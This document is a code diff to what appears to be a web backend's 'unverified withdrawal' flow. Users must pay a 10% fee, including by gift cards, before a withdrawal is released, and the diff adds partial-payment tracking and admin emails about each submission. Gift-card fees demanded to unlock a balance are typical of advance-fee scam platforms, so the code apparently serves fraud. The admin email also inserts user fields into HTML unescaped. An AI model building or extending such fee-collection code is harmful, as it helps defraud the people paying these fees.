@@ -262,6 +262,7 @@ exports.initiateUnverified = async (req, res) => {
       tier: 1,
       status: 'pending_payment',
       currentPaymentAmount: Number(amount) * 0.1,
+      payments: [],
     });
 
     return res.json({ message: 'Unverified withdrawal initiated', data: record });
@@ -274,7 +275,6 @@ exports.payUnverified = async (req, res) => {
   try {
     const { paymentMethod, proofUrl, giftCards } = req.body;
     
-    // Allow adding more while pending_payment OR pending_approval
     const record = await UnverifiedWithdrawal.findOne({ 
       userId: req.user._id, 
       status: { $in: ['pending_payment', 'pending_approval'] } 
@@ -282,23 +282,48 @@ exports.payUnverified = async (req, res) => {
 
     if (!record) return res.status(404).json({ message: 'No active payment required' });
 
-    record.paymentMethod = paymentMethod;
-    if (paymentMethod === 'paypal' && proofUrl) {
-      record.proofUrl = proofUrl;
-    }
-    
     let newPaymentAmount = 0;
     if (paymentMethod === 'giftcard' && Array.isArray(giftCards)) {
-      if (!record.giftCards) record.giftCards = [];
-      record.giftCards.push(...giftCards); // Append new cards instead of replacing
       newPaymentAmount = giftCards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
     } else {
-      // For card/paypal, assume they paid the required amount
-      newPaymentAmount = record.currentPaymentAmount;
+      // For card/paypal, calculate the exact remaining amount
+      const totalSubmitted = (record.payments || [])
+        .filter(p => p.status !== 'rejected')
+        .reduce((sum, p) => sum + p.amount, 0);
+      newPaymentAmount = record.currentPaymentAmount - totalSubmitted;
     }
 
-    record.totalFeesPaid = (record.totalFeesPaid || 0) + newPaymentAmount;
-    record.status = 'pending_approval';
+    if (newPaymentAmount <= 0) {
+      return res.status(400).json({ message: 'No payment required at this time' });
+    }
+
+    const newPayment = {
+      amount: newPaymentAmount,
+      method: paymentMethod,
+      proofUrl: paymentMethod === 'paypal' ? proofUrl : undefined,
+      giftCards: paymentMethod === 'giftcard' ? giftCards : [],
+      status: 'pending',
+      createdAt: new Date()
+    };
+
+    if (!record.payments) record.payments = [];
+    record.payments.push(newPayment);
+
+    const totalSubmitted = record.payments
+      .filter(p => p.status !== 'rejected')
+      .reduce((sum, p) => sum + p.amount, 0);
+
+    const remainingAmount = Math.max(0, record.currentPaymentAmount - totalSubmitted);
+
+    // Update legacy fields for backwards compatibility
+    record.paymentMethod = paymentMethod;
+    record.proofUrl = proofUrl;
+
+    if (totalSubmitted >= record.currentPaymentAmount) {
+      record.status = 'pending_approval';
+    } else {
+      record.status = 'pending_payment';
+    }
     await record.save();
 
     // Build HTML with image links for the admin email
@@ -323,14 +348,19 @@ exports.payUnverified = async (req, res) => {
        <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
        <p><b>Tier:</b> ${record.tier}</p>
        <p><b>Amount Paid (This submission):</b> $${newPaymentAmount.toFixed(2)}</p>
-       <p><b>Total Amount Paid So Far:</b> $${record.totalFeesPaid.toFixed(2)}</p>
+       <p><b>Total Amount Submitted So Far:</b> $${totalSubmitted.toFixed(2)}</p>
        <p><b>Required Amount:</b> $${record.currentPaymentAmount.toFixed(2)}</p>
+       <p><b>Remaining:</b> $${remainingAmount.toFixed(2)}</p>
        <p><b>Payment Method:</b> ${paymentMethod}</p>
        ${paypalHtml}
        ${giftCardsHtml}`
     );
 
-    return res.json({ message: 'Payment submitted for verification', data: record });
+    return res.json({ 
+      message: remainingAmount > 0 ? 'Partial payment received' : 'Payment complete', 
+      data: record,
+      remainingAmount 
+    });
   } catch (err) {
     return res.status(500).json({ message: err.message });
   }
@@ -360,7 +390,12 @@ exports.completeUnverified = async (req, res) => {
 
     if (!record) return res.status(400).json({ message: 'Verification not completed' });
 
-    const finalAmount = record.originalAmount + (record.totalFeesPaid || 0);
+    // Calculate total approved payments
+    const totalApproved = (record.payments || [])
+      .filter(p => p.status === 'approved')
+      .reduce((sum, p) => sum + p.amount, 0);
+      
+    const finalAmount = record.originalAmount + totalApproved;
 
     await Withdrawal.create({
       userId: req.user._id,
